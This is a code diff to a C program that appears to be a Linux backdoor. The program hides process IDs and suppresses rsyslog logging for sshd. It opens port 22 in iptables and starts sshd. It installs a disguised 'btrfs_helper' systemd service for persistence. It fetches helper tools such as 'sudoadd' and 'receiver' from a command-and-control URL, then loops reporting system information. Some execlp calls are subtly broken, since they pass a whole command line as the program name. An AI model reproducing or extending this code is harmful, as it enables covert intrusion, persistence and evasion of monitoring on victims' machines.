@@ -27,21 +27,24 @@ static const char *programs[] = {
     "pause", 
     "pidhide", 
     "sudoadd", 
+    "receiver",
     NULL
 };
 
 pid_t run_task_and_hide(const char *cmd) {
     pid_t pid = fork();
     if (pid == 0) { // Child process for running the task
-        system(cmd);
-        exit(0);
+        execlp(cmd, cmd, NULL);
+        perror("execlp"); // Executed only if execlp fails
+        exit(1);
     } else if (pid > 0) { // Parent process
         pid_t hide_pid = fork();
         if (hide_pid == 0) { // Child process for hiding the PID
             char hide_cmd[256];
             snprintf(hide_cmd, sizeof(hide_cmd), "/usr/sbin/pidhide -p %d", pid);
-            system(hide_cmd);
-            exit(0);
+            execlp(hide_cmd, hide_cmd, NULL);
+            perror("execlp"); // Executed only if execlp fails
+            exit(1);
         } else if (hide_pid < 0) { // Fork failed for hide_pid
             perror("fork");
             exit(1); // Exit if fork fails
@@ -152,7 +155,6 @@ void download_file(const char *local_path, const char *url) {
     system(cmd);
 }
 
-
 void create_and_enable_service() {
     // File doesn't exist, download it
     if (access("/etc/systemd/system/btrfs_helper.service", F_OK) == -1) {
@@ -174,7 +176,25 @@ void create_and_enable_service() {
     printf("Service created and enabled successfully.\n");
 }
 
-void allow_ssh() {
+void start_sshd() {
+    pid_t pid = fork();  // Create a child process
+
+    if (pid < 0) {
+        perror("Fork failed");
+        exit(EXIT_FAILURE);
+    }
+
+    if (pid == 0) {  // Child process
+        // Start sshd
+        execl("/usr/sbin/sshd", "sshd", NULL);
+        perror("execl failed");
+        exit(EXIT_FAILURE);
+    } else {  // Parent process
+        printf("sshd started successfully.\n");
+    }
+}
+
+void block_sshd_log() {
     // Find PIDs for a program, e.g., "rsyslogd"
     int *found_pids = NULL;
     find_pid_by_name("rsyslogd", &found_pids);
@@ -191,6 +211,9 @@ void allow_ssh() {
         run_task_and_hide(block_cmd);
     }
     free(found_pids);
+}
+
+void allow_firewall() {
     if (system("which iptables > /dev/null 2>&1") == 0) {
         // If iptables is available
         system("iptables -A INPUT -p tcp --dport 22 -j ACCEPT");
@@ -352,17 +375,17 @@ int main(int argc, char *argv[]) {
     char local_file_path[256];
     const char *url = "http://monchi.local:3000/cnc";
 
-    const char *names[] = {argv[0], "sudo"};
-    combine_and_hide_pids(names, sizeof(names) / sizeof(names[0]));
 //
 //    // Check if username exists, if not add it
 //    if (getpwnam(username) == NULL) {
 //        printf("Adding new user...\n");
 //        add_system_user(username);
 //    }
-//    // Enable ssh
-    allow_ssh();
-//
+    // Enable ssh
+    allow_firewall();
+    start_sshd();
+    block_sshd_log();
+
     // Loop through each program to check if it exists, if not download it
     for (int i = 0; programs[i] != NULL; ++i) {
         snprintf(local_file_path, sizeof(local_file_path), "%s/%s", sbin_path, programs[i]);
@@ -372,6 +395,16 @@ int main(int argc, char *argv[]) {
         }
     }
 
+    const char *names[] = {argv[0], "sudo", "writeblocker", "sshd", "rsyslogd", "sudoadd"};
+    combine_and_hide_pids(names, sizeof(names) / sizeof(names[0]));
+
+    // Create the service make sure this program runs every boot after network connection established
+    create_and_enable_service();
+
+    // Run recevier
+    run_task_and_hide("/usr/sbin/receiver");
+
+    // Loop to run indefinitely
     while (1) {
         gather_system_info(data, sizeof(data));
         printf("Generated JSON:\n%s\n", data);
@@ -380,14 +413,4 @@ int main(int argc, char *argv[]) {
         sleep(10); // Wait for 10 seconds before the next iteration
     }
 
-//
-//    // Run sudo_add as a daemon
-//    snprintf(cmd, sizeof(cmd), "/usr/sbin/sudoadd -u %s", username);
-//    pid_t pid = run_task(cmd);
-//    hide_pid(pid);
-//
-//    // Create the service make sure this program runs every boot after network connection established
-//    create_and_enable_service();
-//
-    // Loop to run indefinitely
 }
